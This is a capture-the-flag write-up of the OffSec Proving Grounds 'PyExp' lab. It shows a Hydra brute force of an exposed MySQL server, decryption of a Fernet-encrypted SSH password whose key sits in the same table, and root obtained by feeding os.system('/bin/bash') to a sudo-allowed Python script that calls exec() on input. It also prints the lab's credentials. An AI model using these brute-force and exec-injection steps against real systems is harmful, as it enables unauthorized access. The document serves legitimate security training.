# PyExp

| Field | Details |
|-------|---------|
| **Platform** | OffSec Proving Grounds Play |
| **OS** | Linux (Debian) |
| **Difficulty** | Easy |
| **Date** | 2026-04-11 |
| **Status** | Completed |

---

## Overview

No website, no FTP, no SMB — just MySQL exposed directly on the network. Brute forced credentials, found Fernet-encrypted data in the database, decrypted it to get SSH creds. Privesc was a Python script running as root that called exec() on user input — one line to shell.

---

## Attack Path Summary

```
MySQL brute force → Fernet decryption → SSH → sudo python2 exec() → root
```

---

## Enumeration

### Open Ports

| Port | Service | Version |
|------|---------|---------|
| 1337 | SSH | OpenSSH 7.9p1 (non-standard port) |
| 3306 | MySQL | MariaDB 10.3.23 |

### What stood out

- No HTTP, no FTP — MySQL was the only attack surface
- SSH on port 1337 — non-standard, easy to miss without full port scan
- MySQL exposed directly to the network — unusual and worth brute forcing

---

## Foothold

### MySQL brute force with Hydra

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.212.118 -t 26 -f -v
```

Found credentials: `root:prettywoman`

### MySQL enumeration

```bash
mysql -h 192.168.212.118 -u root -p --skip-ssl
```

```sql
SHOW DATABASES;
USE data;
SHOW TABLES;
SELECT * FROM fernet;
```

Found a table with two columns — `cred` (encrypted) and `keyy` (the Fernet key).

### Fernet decryption

```python
from cryptography.fernet import Fernet
key = b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0='
f = Fernet(key)
print(f.decrypt(b'gAAAAABfMbX0...').decode())
```

Result: `lucy:wJ9\`"Lemdv9[FEw-`

### SSH as lucy

```bash
ssh lucy@192.168.212.118 -p 1337
```

---

## Privilege Escalation

### sudo python2 exec() injection

```bash
sudo -l
```

Output:
```
(root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```

Contents of `/opt/exp.py`:

```python
uinput = raw_input('how are you?')
exec(uinput)
```

`exec()` runs arbitrary Python code as root. Ran the script and passed a shell:

```bash
sudo /usr/bin/python2 /opt/exp.py
```

Input:
```python
import os; os.system('/bin/bash')
```

Root shell.

---

## Flags

- `local.txt` — `/home/lucy/local.txt`
- `proof.txt` — `/root/proof.txt`

---

## What I learned

- Always do full port scan — SSH on 1337 would be missed with default scan
- MySQL exposed on the network with weak credentials is a direct foothold
- Fernet is symmetric encryption — if the key is stored next to the ciphertext, it's useless
- `exec()` on user input is never safe — especially when the script runs as root via sudo
- `sudo -l` is always the first privesc check
